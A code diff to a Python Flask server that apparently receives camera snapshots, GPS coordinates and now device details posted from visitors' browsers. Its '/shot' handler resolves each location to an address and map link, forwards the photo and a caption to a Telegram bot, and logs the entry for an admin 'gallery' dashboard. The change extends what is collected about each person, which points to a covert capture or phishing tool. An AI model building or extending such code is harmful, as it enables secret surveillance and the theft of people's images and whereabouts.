@@ -13,7 +13,6 @@ LOG_FILE = "capture_log.json"
 def check_auth(auth):
     return auth and auth.username == "admin" and auth.password == ADMIN_PASSWORD
 
-# FIXED: Takes the single location string and splits it properly
 def get_address(location_string):
     if not location_string or "denied" in location_string or "not supported" in location_string or location_string == "Unknown Location":
         return "Unknown Location"
@@ -74,6 +73,7 @@ def gallery():
         .log-item {{ background: var(--card); padding: 15px; border-radius: 8px; border-left: 4px solid var(--accent); display: flex; justify-content: space-between; align-items: center; }}
         .log-time {{ color: #94a3b8; font-size: 12px; }}
         .log-loc {{ font-weight: bold; color: #10b981; font-size: 15px; }}
+        .log-device {{ color: #94a3b8; font-size: 11px; margin-top: 4px; display: block; max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }}
         .no-data {{ text-align: center; padding: 40px; color: #64748b; font-size: 18px; }}
     </style>
     <script>
@@ -112,6 +112,7 @@ def gallery():
             <div>
                 <span class="log-time">📅 {item.get('time', '')}</span><br>
                 <span class="log-loc">📍 {item.get('address', 'Unknown')}</span>
+                <span class="log-device">📱 {item.get('device', 'Unknown Device')}</span>
             </div>
             <a href="{item.get('map_link', '#')}" target="_blank" class="btn" style="padding: 8px 15px; font-size: 13px; background:#10b981; color:white;">View Map</a>
         </div>
@@ -125,30 +126,35 @@ def shot():
     data = request.get_json(force=True)
     b64 = (data.get("img") or "").split(",", 1)[-1]
     raw_loc = data.get("loc", "Unknown Location")
+    device_info = data.get("device", "Unknown Device")
     
     if b64 and TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
         try:
-            # 1. Convert GPS to Address
             address = get_address(raw_loc)
             map_link = f"https://www.google.com/maps?q={raw_loc.replace(' ', '')}" if "," in raw_loc else "#"
             
-            # 2. Send to Telegram
             img_data = base64.b64decode(b64)
             url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
             files = {'photo': ('image.jpg', img_data, 'image/jpeg')}
             
-            caption_text = f"📸 Capture: {datetime.datetime.now():%Y-%m-%d %H:%M:%S}\n📍 Location: {address}\n🗺️ Map: {map_link}"
+            caption_text = (
+                f"📸 Capture: {datetime.datetime.now():%Y-%m-%d %H:%M:%S}\n"
+                f"📍 Location: {address}\n"
+                f"🗺️ Map: {map_link}\n"
+                f"📱 Device: {device_info}"
+            )
+            
             payload = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption_text}
             
             tg_res = requests.post(url, data=payload, files=files)
             if tg_res.status_code != 200:
                 print("Telegram API Error:", tg_res.text)
 
-            # 3. Save to local log for the Dashboard
             log_entry = {
                 "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 "address": address,
-                "map_link": map_link
+                "map_link": map_link,
+                "device": device_info
             }
             
             logs = []
